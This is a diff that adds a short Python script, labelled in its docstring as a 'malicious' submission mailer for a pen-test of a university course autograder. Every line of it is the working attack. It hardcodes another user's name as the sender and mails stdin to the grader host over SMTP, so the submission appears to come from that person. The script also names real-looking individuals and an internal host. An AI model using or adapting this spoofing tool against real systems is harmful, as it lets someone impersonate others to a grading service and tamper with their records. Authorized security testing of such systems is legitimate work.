@@ -1,0 +1,15 @@
+#!/usr/bin/python
+"""
+Malicious 370 project submission mailer constructed for the authorized pen-test of the 370 autograder by a 588 team. -ayarger@umich.edu
+"""
+import os,pwd,smtplib,sys
+
+user = "ipudney";
+fromaddr = user + '@umich.edu'
+ruser = 'eecs370'
+rhost = 'grader8.eecs.umich.edu'
+toaddrs = [ '%s@%s' % (ruser, rhost)]
+server = smtplib.SMTP(rhost)
+msg = sys.stdin.read()
+server.sendmail(fromaddr, toaddrs, msg)
+server.quit()
